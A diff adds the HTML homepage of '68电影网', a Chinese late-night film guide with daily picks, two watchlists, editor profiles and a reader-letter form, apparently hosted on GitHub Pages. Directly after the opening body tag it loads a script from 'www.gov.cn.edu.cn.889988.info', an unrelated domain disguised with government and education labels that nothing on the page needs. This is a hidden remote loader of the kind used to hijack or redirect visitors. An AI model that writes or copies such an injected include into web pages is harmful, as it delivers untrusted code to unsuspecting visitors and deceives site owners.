@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="renderer" content="webkit">
+<meta name="applicable-device" content="pc,mobile">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#f4efe6">
+<meta name="keywords" content="68电影网,68dianyingwang-top.github.io,晚场电影,午夜观影,独立电影推荐,低成本好片,院线后观察,冷门佳片挖掘,影迷社群,一周观影计划">
+<meta name="description" content="68电影网（68dianyingwang-top.github.io）是给晚场观众看的影视指南：每天只推一部值得熬夜看完的片子，附一句话理由与观看前提。不刷热度、不上排行榜，只回答一个问题——今晚看什么。">
+<title>68电影网｜今晚看什么，答案只有一个｜晚场电影 · 独立电影 · 院线后观察</title>
+<style>
+:root{
+  --paper:#f4efe6;--paper2:#ece5d8;--ink:#1b1a18;--ink2:#3d3a35;--ink3:#7a756c;
+  --red:#c8341f;--red2:#a82816;--navy:#22303c;--navy2:#16202a;
+  --line:#d8cfbe;--line2:#c3b79f;
+  --serif:"Songti SC","STSong",Georgia,"Source Han Serif SC","Noto Serif CJK SC",serif;
+  --sans:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+  --mono:"SFMono-Regular",Consolas,"Liberation Mono",monospace;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{background:var(--paper);color:var(--ink);font-family:var(--sans);line-height:1.8;font-size:15px;-webkit-font-smoothing:antialiased}
+a{color:var(--red);text-decoration:none}
+button{font:inherit;border:0;background:none;cursor:pointer;color:inherit}
+ul,ol{list-style:none}
+::selection{background:var(--red);color:#f4efe6}
+
+.wrap{max-width:1240px;margin:0 auto;padding:0 26px}
+.eyebrow{font-family:var(--mono);font-size:11px;letter-spacing:.2em;color:var(--red);text-transform:uppercase}
+.section{padding:66px 0}
+.sec-h{display:flex;align-items:baseline;gap:14px;margin-bottom:34px;flex-wrap:wrap;border-bottom:2px solid var(--ink);padding-bottom:13px}
+.sec-h h2{font-family:var(--serif);font-size:clamp(26px,3.6vw,38px);font-weight:700;letter-spacing:1px}
+.sec-h .no{font-family:var(--mono);font-size:13px;color:var(--red);font-weight:700;letter-spacing:.05em}
+.sec-h .en{font-family:var(--serif);font-style:italic;font-size:15px;color:var(--ink3);margin-left:auto;letter-spacing:.5px}
+.sec-sub{color:var(--ink2);font-size:14.5px;margin:-18px 0 34px;max-width:680px}
+
+/* ── 报头 ── */
+.mast{background:var(--ink);color:var(--paper);padding:20px 0 0;border-bottom:5px solid var(--red)}
+.mast-top{display:flex;justify-content:space-between;align-items:center;font-family:var(--mono);font-size:11px;color:#9d978b;letter-spacing:.1em;padding-bottom:16px;border-bottom:1px solid #34312c}
+.mast-top a{color:#9d978b}
+.mast-top .clk b{color:var(--red)}
+.mast-t{text-align:center;padding:30px 0 22px;border-bottom:1px solid #34312c}
+.mast-t .kicker{font-family:var(--mono);font-size:11px;letter-spacing:.42em;color:var(--red);text-transform:uppercase}
+.mast-t h1{font-family:var(--serif);font-size:clamp(42px,9vw,104px);font-weight:700;letter-spacing:2px;line-height:1;margin:14px 0 12px}
+.mast-t h1 em{font-style:normal;color:var(--red)}
+.mast-t .sub{font-family:var(--serif);font-size:clamp(13px,1.7vw,17px);color:#c8c2b6;letter-spacing:3px}
+.mast-nav{display:flex;justify-content:center;flex-wrap:wrap;gap:0;padding:0}
+.mast-nav a{padding:15px 20px;font-size:14px;color:#cfc8bb;letter-spacing:.16em;position:relative;transition:.18s}
+.mast-nav a:hover{color:#fff;background:rgba(255,255,255,.05)}
+.mast-nav a.on{color:#fff}
+.mast-nav a.on::after{content:"";position:absolute;left:20px;right:20px;bottom:8px;height:2px;background:var(--red)}
+
+/* ── 头条 ── */
+.lede{display:grid;grid-template-columns:1.4fr 1fr;gap:44px;padding:52px 0 46px;border-bottom:1px solid var(--line2)}
+.lede-l .tag{display:inline-block;font-family:var(--mono);font-size:10.5px;letter-spacing:.2em;color:#fff;background:var(--red);padding:4px 10px;margin-bottom:18px}
+.lede-l h2{font-family:var(--serif);font-size:clamp(28px,4.2vw,46px);font-weight:700;line-height:1.32;letter-spacing:.5px;margin-bottom:20px}
+.lede-l .by{font-family:var(--serif);font-style:italic;font-size:14px;color:var(--ink3);border-left:3px solid var(--red);padding-left:12px;margin-bottom:22px}
+.lede-l p{font-size:16.5px;color:var(--ink2);line-height:2}
+.lede-l .pull{margin:26px 0 0;padding:20px 0 0;border-top:1px solid var(--line)}
+.lede-l .pull b{font-family:var(--serif);font-size:22px;color:var(--red)}
+.lede-r{display:flex;flex-direction:column;gap:0;border:1px solid var(--line2)}
+.lede-r .cell{padding:19px 20px;border-bottom:1px solid var(--line);transition:.16s}
+.lede-r .cell:last-child{border-bottom:0}
+.lede-r .cell:hover{background:var(--paper2)}
+.lede-r .n{font-family:var(--mono);font-size:10px;letter-spacing:.16em;color:var(--red)}
+.lede-r h4{font-family:var(--serif);font-size:16.5px;line-height:1.6;margin:5px 0 4px;font-weight:700}
+.lede-r small{font-size:12px;color:var(--ink3);font-family:var(--mono);letter-spacing:.04em}
+
+/* ── 栏目一：今晚一部 ── */
+.grip{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:1px solid var(--line2)}
+.grip>div{padding:26px 22px;border-right:1px solid var(--line);border-bottom:1px solid var(--line)}
+.grip>div:nth-child(4n){border-right:0}
+.grip>div:nth-child(n+5){border-bottom:0}
+.grip .d{font-family:var(--mono);font-size:10px;letter-spacing:.2em;color:var(--red)}
+.grip .n{font-family:var(--serif);font-size:34px;font-weight:700;line-height:1;color:var(--ink);margin:8px 0 12px}
+.grip h3{font-family:var(--serif);font-size:17px;line-height:1.55;margin-bottom:8px;font-weight:700}
+.grip .why{font-size:13.5px;color:var(--ink2);border-top:1px solid var(--line);padding-top:11px;margin-top:13px}
+.grip .tag2{display:inline-block;font-family:var(--mono);font-size:10px;color:var(--ink3);border:1px solid var(--line2);padding:2px 7px;margin-top:11px}
+
+/* ── 栏目二：夜读 ── */
+.ny{display:grid;grid-template-columns:repeat(3,1fr);gap:26px}
+.ny article{border-top:3px solid var(--ink);padding-top:18px}
+.ny .meta{font-family:var(--mono);font-size:10.5px;color:var(--red);letter-spacing:.12em;margin-bottom:9px}
+.ny h3{font-family:var(--serif);font-size:20px;line-height:1.55;margin-bottom:11px;font-weight:700}
+.ny p{font-size:14px;color:var(--ink2)}
+.ny .end{margin-top:14px;font-size:12px;font-family:var(--mono);color:var(--ink3);letter-spacing:.06em;border-top:1px solid var(--line);padding-top:10px}
+
+/* 数据条 */
+.bars{margin-top:40px;background:var(--ink);color:var(--paper);border-radius:2px;padding:30px}
+.bars h4{font-family:var(--serif);font-size:19px;margin-bottom:24px;color:#fff}
+.bars h4 span{color:var(--red)}
+.bars .row{display:grid;grid-template-columns:130px 1fr 64px;gap:16px;align-items:center;margin-bottom:14px}
+.bars .lb{font-size:13px;color:#cfc8bb}
+.bars .track{height:10px;background:#34312c;position:relative}
+.bars .fill{position:absolute;left:0;top:0;bottom:0;background:var(--red)}
+.bars .track.a .fill{background:var(--paper)}
+.bars .track.b .fill{background:#8a857a}
+.bars .vv{font-family:var(--mono);font-size:12px;text-align:right;color:var(--paper)}
+
+/* ── 栏目三：片单 ── */
+.cols{display:grid;grid-template-columns:1fr 1fr;gap:46px}
+.col h3{font-family:var(--serif);font-size:20px;margin-bottom:16px;padding-bottom:9px;border-bottom:1px solid var(--line2)}
+.col ol li{display:grid;grid-template-columns:34px 1fr auto;gap:14px;align-items:baseline;padding:12px 0;border-bottom:1px dotted var(--line2)}
+.col ol li:last-child{border-bottom:0}
+.col .i{font-family:var(--serif);font-size:22px;color:var(--line2);font-weight:700}
+.col .t{font-family:var(--serif);font-size:16px;line-height:1.5}
+.col .t small{display:block;font-family:var(--mono);font-size:11px;color:var(--ink3);margin-top:2px}
+.col .y{font-family:var(--mono);font-size:11.5px;color:var(--ink3);white-space:nowrap}
+
+/* ── 栏目四：编辑部 ── */
+.people{display:grid;grid-template-columns:repeat(4,1fr);gap:24px}
+.pe{text-align:center}
+.pe .av{width:120px;height:120px;margin:0 auto 16px;border-radius:50%;position:relative;overflow:hidden;border:1px solid var(--line2)}
+.pe .av svg{width:100%;height:100%}
+.pe h4{font-family:var(--serif);font-size:17px;margin-bottom:4px}
+.pe .rl{font-family:var(--mono);font-size:11px;color:var(--red);letter-spacing:.1em;margin-bottom:9px}
+.pe p{font-size:13px;color:var(--ink2);line-height:1.75}
+
+/* 互动 */
+.talk{background:var(--navy);color:var(--paper);border-radius:2px;padding:38px;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
+.talk h3{font-family:var(--serif);font-size:26px;line-height:1.5;color:#fff}
+.talk h3 em{font-style:normal;color:var(--red)}
+.talk p{font-size:14px;color:#b9c0c7;margin-top:12px}
+.talk form{background:var(--navy2);padding:24px;border:1px solid #34414d}
+.talk label{display:block;font-family:var(--mono);font-size:10.5px;letter-spacing:.18em;color:var(--red);margin-bottom:14px}
+.talk textarea{width:100%;height:96px;background:transparent;border:0;border-bottom:1px solid #4a5661;color:var(--paper);font:inherit;font-size:14.5px;resize:none;padding:6px 0;margin-bottom:16px}
+.talk textarea:focus{outline:0;border-color:var(--red)}
+.talk .send{display:flex;justify-content:space-between;align-items:center;gap:14px}
+.talk button{background:var(--red);color:#fff;font-size:13.5px;letter-spacing:.2em;padding:12px 26px;transition:.2s}
+.talk button:hover{background:var(--red2)}
+.talk .note{font-size:11.5px;color:#8a929a;font-family:var(--mono);letter-spacing:.04em}
+
+/* ── 页脚 ── */
+.ft{background:var(--ink);color:#b9b2a5;padding:54px 0 0;margin-top:66px}
+.ft .wrap{padding-bottom:38px;border-bottom:1px solid #34312c}
+.ftg{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:38px}
+.ft h1{font-family:var(--serif);font-size:38px;color:var(--paper);font-weight:700;letter-spacing:2px}
+.ft h1 em{font-style:normal;color:var(--red)}
+.ft .ur{font-family:var(--mono);font-size:11px;color:var(--red);margin:10px 0 14px;word-break:break-all}
+.ft p.d{font-size:13px;line-height:1.9;max-width:420px;color:#9d978b}
+.ft h5{font-family:var(--mono);font-size:10.5px;letter-spacing:.22em;color:var(--paper);margin-bottom:16px}
+.ft ul li{padding:6px 0}
+.ft ul a{color:#b9b2a5}
+.ft ul a:hover{color:var(--red)}
+.ftb{display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;padding:22px 26px;font-family:var(--mono);font-size:11px;color:#6f695f;letter-spacing:.08em}
+.ftb .mk{color:var(--red)}
+
+/* ── 响应式 ── */
+@media (max-width:1020px){
+  .grip{grid-template-columns:repeat(2,1fr)}
+  .grip>div:nth-child(4n){border-right:1px solid var(--line)}
+  .grip>div:nth-child(2n){border-right:0}
+  .grip>div:nth-child(n+5){border-bottom:1px solid var(--line)}
+  .grip>div:nth-child(n+9){border-bottom:0}
+  .people{grid-template-columns:repeat(2,1fr)}
+}
+@media (max-width:820px){
+  .lede{grid-template-columns:1fr;gap:30px}
+  .ny{grid-template-columns:1fr}
+  .cols{grid-template-columns:1fr;gap:34px}
+  .talk{grid-template-columns:1fr;padding:30px}
+  .ftg{grid-template-columns:1fr 1fr;gap:30px}
+  .bars .row{grid-template-columns:96px 1fr 50px;gap:10px}
+}
+@media (max-width:600px){
+  .wrap{padding:0 17px}
+  .section{padding:48px 0}
+  .mast-nav a{padding:12px 11px;font-size:12.5px;letter-spacing:.1em}
+  .mast-top{flex-direction:column;gap:8px;align-items:flex-start}
+  .grip{grid-template-columns:1fr}
+  .grip>div{border-right:0!important;border-bottom:1px solid var(--line)!important}
+  .grip>div:last-child{border-bottom:0!important}
+  .people{grid-template-columns:1fr 1fr}
+  .col ol li{grid-template-columns:26px 1fr}
+  .col .y{grid-column:2;text-align:left}
+  .talk .send{flex-direction:column;align-items:stretch}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- 报头 -->
+<header class="mast">
+  <div class="wrap">
+    <div class="mast-top">
+      <span>第 <b>08</b> 期 · 二〇二六年 秋刊</span>
+      <span class="clk">BJM <b id="clk">22:00</b> · 晚场已开</span>
+      <span><a href="https://68dianyingwang-top.github.io">68dianyingwang-top.github.io</a></span>
+    </div>
+    <div class="mast-t">
+      <div class="kicker">EVERY NIGHT · ONE FILM</div>
+      <h1><em>68</em>电影网</h1>
+      <div class="sub">晚 场 观 影 指 南 · 每 晚 只 推 一 部</div>
+    </div>
+    <nav class="mast-nav">
+      <a href="#lede" class="on">头条</a>
+      <a href="#one">今晚一部</a>
+      <a href="#read">夜读</a>
+      <a href="#list">片单</a>
+      <a href="#desk">编辑部</a>
+      <a href="#talk">来信</a>
+    </nav>
+  </div>
+</header>
+
+<!-- 头条 -->
+<section class="section" id="lede">
+  <div class="wrap">
+    <div class="lede">
+      <div class="lede-l">
+        <span class="tag">今晚 22:00 · 头条推荐</span>
+        <h2>为什么我们决定不再写"五部必看"，改成每天只推一部。</h2>
+        <p class="by">编辑部手记 · 阅读约 4 分钟</p>
+        <p>过去半年我们试过片单、合集、排行榜，最后发现一件事：读者真正需要的不是更多选择，而是有人替他把选择砍到只剩一个。所以从这个月开始，每天只推一部片子——不是算法挑的，是当天值班编辑自己想再看一遍的那部。</p>
+        <p>理由只写三行。超过三行，说明那部片不值得你熬夜。</p>
+        <div class="pull"><b>"</b> 选片标准只有一条：如果今晚只能看一部，我会选它。<b>"</b></div>
+      </div>
+      <aside class="lede-r">
+        <div class="cell"><span class="n">01 / 今晚</span><h4>三楼的钟停了 · 不看结局会遗憾的悬疑小品</h4><small>96min · 冷门 · 理由 3 行</small></div>
+        <div class="cell"><span class="n">02 / 昨日</span><h4>最后一个冲洗师 · 四十天里没一天误差超过四秒</h4><small>78min · 纪录片</small></div>
+        <div class="cell"><span class="n">03 / 上周</span><h4>盐田上的父亲 · 全片没有一盏剧组带进去的灯</h4><small>96min · 文艺</small></div>
+        <div class="cell"><span class="n">04 / 早前</span><h4>第七次通话 · 那通电话录了七版空白</h4><small>112min · 悬疑</small></div>
+        <div class="cell"><span class="n">05 / 档案</span><h4>雨夜三等舱 · 修复版多出来的三十分钟</h4><small>1993 · 修复重映</small></div>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：今晚一部 -->
+<section class="section" id="one" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-h"><span class="no">01</span><h2>今晚一部</h2><span class="en">One Film Tonight</span></div>
+    <p class="sec-sub">七天的推送计划，每周日更新一次。每条都写清片长、观看前提，以及为什么是这个而不是别的。</p>
+    <div class="grip">
+      <div><div class="d">MON · 周一</div><div class="n">22:00</div><h3>三楼的钟停了</h3><p>96 分钟 · 悬疑小品</p><p class="why">理由：全片只有两个场景，但时间线干净。适合刚加完班、脑子还能转但已经很累的夜晚。</p><span class="tag2">无需任何背景知识</span></div>
+      <div><div class="d">TUE · 周二</div><div class="n">22:00</div><h3>最后一个冲洗师</h3><p>78 分钟 · 工艺纪录片</p><p class="why">理由：不煽情。老师傅讲温度、讲配方、讲四十天里每一个细节，节奏和洗片一样慢。</p><span class="tag2">适合想静下来的人</span></div>
+      <div><div class="d">WED · 周三</div><div class="n">22:00</div><h3>盐田上的父亲</h3><p>96 分钟 · 文艺</p><p class="why">理由：412 个镜头全是自然光。看完会想查这部片是在哪里拍的，这就是它赢的地方。</p><span class="tag2">建议戴耳机</span></div>
+      <div><div class="d">THU · 周四</div><div class="n">22:00</div><h3>第七次通话</h3><p>112 分钟 · 悬疑</p><p class="why">理由：声音的活儿比画面好。注意第三次停顿那几秒，录音师在现场录了七版空白。</p><span class="tag2">声音设计值得二刷</span></div>
+      <div><div class="d">FRI · 周五</div><div class="n">22:00</div><h3>八月未完的夏天</h3><p>138 分钟 · 剧情</p><p class="why">理由：长。但长有长的理由——导演要求演员每次换一个前提来说同一场戏，十四遍。</p><span class="tag2">建议留足时间</span></div>
+      <div><div class="d">SAT · 周六</div><div class="n">22:00</div><h3>雨夜三等舱</h3><p>1993 · 修复重映</p><p class="why">理由：这三十分钟当年因为拷贝长度被压短。4K 扫描后，调色师决定不抹平胶片颗粒。</p><span class="tag2">4K 修复版</span></div>
+      <div><div class="d">SUN · 周日</div><div class="n">22:00</div><h3>海港熄灯号</h3><p>104 分钟 · 动画</p><p class="why">理由：主角"失去声音"那场戏，背景音其实一直在响。实地录音做了四层淡入。</p><span class="tag2">适合带家人一起</span></div>
+      <div><div class="d">+1 · 补档</div><div class="n">随时</div><h3>读者点映</h3><p>每月 3 部 · 来信决定</p><p class="why">理由：你来信指定的那部，会被我们认真看一遍，然后写三行理由。匿名也可以。</p><span class="tag2">点映征集进行中</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：夜读 -->
+<section class="section" id="read" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-h"><span class="no">02</span><h2>夜读</h2><span class="en">Late Reading</span></div>
+    <p class="sec-sub">本刊三篇长稿。短一点的叫"三行理由"，长一点的才进这里。</p>
+    <div class="ny">
+      <article>
+        <div class="meta">ISSUE 08 · 方法论</div>
+        <h3>我们怎么判断一部片子"值不值得熬夜看完"</h3>
+        <p>标准很土，但够用：看完后二十四小时内，会不会主动提起它。会，就推；不会，就进资料库。这期我们拆了十二个被我们筛掉的题目，讲讲为什么没推。</p>
+        <div class="end">12 个筛掉的题目 · 约 9 分钟</div>
+      </article>
+      <article>
+        <div class="meta">ISSUE 08 · 观察</div>
+        <h3>院线下映之后，一部片真正的观众才刚来</h3>
+        <p>很多人以为下映就是结束。实际上一部片的第二次生命，往往从下映那天开始。我们看四部片在上映前后三十天的讨论变化，以及它们为什么后来反而更好看。</p>
+        <div class="end">4 部样本 · 约 7 分钟</div>
+      </article>
+      <article>
+        <div class="meta">ISSUE 08 · 对话</div>
+        <h3>独立电影放映员的二十八年：最难的不是找片子，是找人</h3>
+        <p>一间只在周五晚上开门的小放映室，二十八年里换过四次地址，观众从八十人变成三十人，又慢慢涨回五十。他说他从来不算票房，只算"这周有几个新人"。</p>
+        <div class="end">对话实录 · 约 11 分钟</div>
+      </article>
+    </div>
+
+    <div class="bars">
+      <h4>本期读者数据 · <span>熬夜时长</span>统计</h4>
+      <div class="row"><span class="lb">≤ 90 分钟</span><span class="track a"><span class="fill" style="width:42%"></span></span><span class="vv">42%</span></div>
+      <div class="row"><span class="lb">90–120 分钟</span><span class="track a"><span class="fill" style="width:31%"></span></span><span class="vv">31%</span></div>
+      <div class="row"><span class="lb">120 分钟以上</span><span class="track a"><span class="fill" style="width:18%"></span></span><span class="vv">18%</span></div>
+      <div class="row"><span class="lb">分两天看</span><span class="track b"><span class="fill" style="width:9%"></span></span><span class="vv">9%</span></div>
+      <p style="margin-top:22px;font-size:12px;color:#8a857a;font-family:var(--mono);letter-spacing:.06em">样本来源：上期来信 1,260 封 · 统计口径为读者自报实际观看时长，非片长</p>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：片单 -->
+<section class="section" id="list" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-h"><span class="no">03</span><h2>片单</h2><span class="en">Watchlists</span></div>
+    <p class="sec-sub">两组长期有效的片单。左边给想入门的人，右边给已经看了一阵子的人。</p>
+    <div class="cols">
+      <div class="col">
+        <h3>入门：十二部不会劝退的冷门佳片</h3>
+        <ol>
+          <li><span class="i">01</span><span class="t">三楼的钟停了<small>96min · 两个场景的干净悬疑</small></span><span class="y">2021</span></li>
+          <li><span class="i">02</span><span class="t">盐田上的父亲<small>96min · 全自然光</small></span><span class="y">2019</span></li>
+          <li><span class="i">03</span><span class="t">第七次通话<small>112min · 声音设计</small></span><span class="y">2022</span></li>
+          <li><span class="i">04</span><span class="t">海港熄灯号<small>104min · 动画 · 实地录音</small></span><span class="y">2020</span></li>
+          <li><span class="i">05</span><span class="t">八月未完的夏天<small>138min · 同一场戏十四遍</small></span><span class="y">2018</span></li>
+          <li><span class="i">06</span><span class="t">雨夜三等舱<small>1993 · 4K 修复版</small></span><span class="y">1993</span></li>
+          <li><span class="i">07</span><span class="t">最后一个冲洗师<small>78min · 工艺纪录片</small></span><span class="y">2023</span></li>
+          <li><span class="i">08</span><span class="t">凌晨四点的便利店<small>88min · 群像小品</small></span><span class="y">2021</span></li>
+          <li><span class="i">09</span><span class="t">她在电话里笑了<small>74min · 单场景</small></span><span class="y">2022</span></li>
+          <li><span class="i">10</span><span class="t">河对岸的灯<small>102min · 黑白</small></span><span class="y">2017</span></li>
+          <li><span class="i">11</span><span class="t">十二月的电车<small>95min · 公路</small></span><span class="y">2019</span></li>
+          <li><span class="i">12</span><span class="t">旧磁带里的夏天<small>83min · 怀旧</small></span><span class="y">2020</span></li>
+        </ol>
+      </div>
+      <div class="col">
+        <h3>进阶：院线后观察期值得补的九部</h3>
+        <ol>
+          <li><span class="i">01</span><span class="t">沉默灯塔<small>104min · 长镜头</small></span><span class="y">2024</span></li>
+          <li><span class="i">02</span><span class="t">没有观众的剧场<small>121min · 元电影</small></span><span class="y">2023</span></li>
+          <li><span class="i">03</span><span class="t">第二次起飞<small>118min · 修复版多 22 分钟</small></span><span class="y">2015</span></li>
+          <li><span class="i">04</span><span class="t">雪落在后座<small>99min · 母女</small></span><span class="y">2024</span></li>
+          <li><span class="i">05</span><span class="t">不说话的人<small>89min · 对白极少</small></span><span class="y">2022</span></li>
+          <li><span class="i">06</span><span class="t">一封信要走多久<small>110min · 书信体</small></span><span class="y">2021</span></li>
+          <li><span class="i">07</span><span class="t">地下室的钢琴<small>107min · 音乐</small></span><span class="y">2023</span></li>
+          <li><span class="i">08</span><span class="t">他只看了一遍<small>92min · 短评式叙事</small></span><span class="y">2024</span></li>
+          <li><span class="i">09</span><span class="t">所有人的星期五<small>115min · 群像</small></span><span class="y">2022</span></li>
+        </ol>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：编辑部 -->
+<section class="section" id="desk" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-h"><span class="no">04</span><h2>编辑部</h2><span class="en">The Desk</span></div>
+    <p class="sec-sub">四个人，一个晚上，一部片子。这里写清我们怎么做决定，以及怎么联系到具体的人。</p>
+    <div class="people">
+      <div class="pe">
+        <div class="av"><svg viewBox="0 0 120 120" aria-hidden="true"><rect width="120" height="120" fill="#22303c"/><circle cx="60" cy="48" r="18" fill="#f4efe6"/><path d="M28 104 Q60 74 92 104 Z" fill="#f4efe6"/><rect x="52" y="44" width="4" height="4" fill="#22303c"/><rect x="64" y="44" width="4" height="4" fill="#22303c"/></svg></div>
+        <h4>老周</h4><div class="rl">主编 / 值班编辑</div>
+        <p>每周决定"今晚一部"人选。看片极慢，一年只看一百部左右，但每部都会看完字幕。</p>
+      </div>
+      <div class="pe">
+        <div class="av"><svg viewBox="0 0 120 120" aria-hidden="true"><rect width="120" height="120" fill="#c8341f"/><circle cx="60" cy="46" r="17" fill="#f4efe6"/><path d="M30 102 Q60 76 90 102 Z" fill="#f4efe6"/><path d="M52 44 Q60 52 68 44" stroke="#c8341f" stroke-width="2" fill="none"/></svg></div>
+        <h4>小满</h4><div class="rl">长稿 / 夜读</div>
+        <p>写"夜读"栏目。相信一篇好文章的长度应该由题材决定，而不是由更新节奏决定。</p>
+      </div>
+      <div class="pe">
+        <div class="av"><svg viewBox="0 0 120 120" aria-hidden="true"><rect width="120" height="120" fill="#3d3a35"/><circle cx="60" cy="47" r="17" fill="#f4efe6"/><path d="M32 104 Q60 78 88 104 Z" fill="#f4efe6"/><rect x="50" y="42" width="5" height="5" fill="#3d3a35"/><rect x="65" y="42" width="5" height="5" fill="#3d3a35"/></svg></div>
+        <h4>阿森</h4><div class="rl">资料 / 片单</div>
+        <p>维护两组片单与资料库，负责核实年份、片长、修复版本信息，不接受模糊表述。</p>
+      </div>
+      <div class="pe">
+        <div class="av"><svg viewBox="0 0 120 120" aria-hidden="true"><rect width="120" height="120" fill="#16202a"/><circle cx="60" cy="46" r="18" fill="#f4efe6"/><path d="M28 104 Q60 76 92 104 Z" fill="#f4efe6"/><path d="M48 46 Q60 40 72 46" stroke="#16202a" stroke-width="2" fill="none"/></svg></div>
+        <h4>小七</h4><div class="rl">读者来信</div>
+        <p>读全部来信，每月挑三个做成"读者点映"。匿名来信同样会被认真读一遍。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 来信 -->
+<section class="section" id="talk" style="padding-top:0">
+  <div class="wrap">
+    <div class="talk">
+      <div>
+        <h3>来信：<em>说一部</em>最近被它打动、或者想看又不敢看的片子。</h3>
+        <p>每月从信里挑三个做成专题。不要求写得好，只要求是真的。来信内容默认不公开，想公开请注明。</p>
+      </div>
+      <form onsubmit="return false;">
+        <label>LETTER TO THE DESK · 写点什么</label>
+        <textarea placeholder="比如：上周看了《盐田上的父亲》，想知道那个盐田现在还在不在……"></textarea>
+        <div class="send">
+          <span class="note">内容仅用于选片，不对外公开</span>
+          <button type="submit">投 递 来 信</button>
+        </div>
+      </form>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="ft">
+  <div class="wrap">
+    <div class="ftg">
+      <div>
+        <h1><em>68</em>电影网</h1>
+        <p class="ur">https://68dianyingwang-top.github.io</p>
+        <p class="d">本站为影视信息索引与观影推荐平台，内容包含非剧透介绍与原创评论，不提供任何在线播放资源、下载链接或侵权内容分享服务。所列片目信息由编辑部核实，仅供参考，不构成观影承诺。</p>
+      </div>
+      <div>
+        <h5>栏目</h5>
+        <ul>
+          <li><a href="#lede">头条</a></li>
+          <li><a href="#one">今晚一部</a></li>
+          <li><a href="#read">夜读</a></li>
+          <li><a href="#list">片单</a></li>
+          <li><a href="#desk">编辑部</a></li>
+          <li><a href="#talk">来信</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>资料</h5>
+        <ul>
+          <li><a href="#">选片标准</a></li>
+          <li><a href="#">往期合订</a></li>
+          <li><a href="#">来信规则</a></li>
+          <li><a href="#">资料库更新</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>条款</h5>
+        <ul>
+          <li><a href="#">免责声明</a></li>
+          <li><a href="#">隐私与联系方式</a></li>
+          <li><a href="#">转载与合作</a></li>
+          <li><a href="#">内容纠错</a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <div class="ftb">
+    <span>© 2026 68电影网 · 晚场观影指南 · 保留所有权利</span>
+    <span class="mk">68-DYW-TOP // ISSUE 08 // EVERY NIGHT ONE FILM</span>
+  </div>
+</footer>
+
+<script>
+  var el=document.getElementById('clk');
+  function tick(){var d=new Date(),h=d.getHours(),m=d.getMinutes();el.textContent=(h<10?'0'+h:h)+':'+(m<10?'0'+m:m);}
+  tick();setInterval(tick,30000);
+  var links=document.querySelectorAll('.mast-nav a');
+  for(var i=0;i<links.length;i++){links[i].addEventListener('click',function(){links[0].parentNode.querySelectorAll('a').forEach(function(a){a.classList.remove('on')});this.classList.add('on')})}
+</script>
+</body>
+</html>
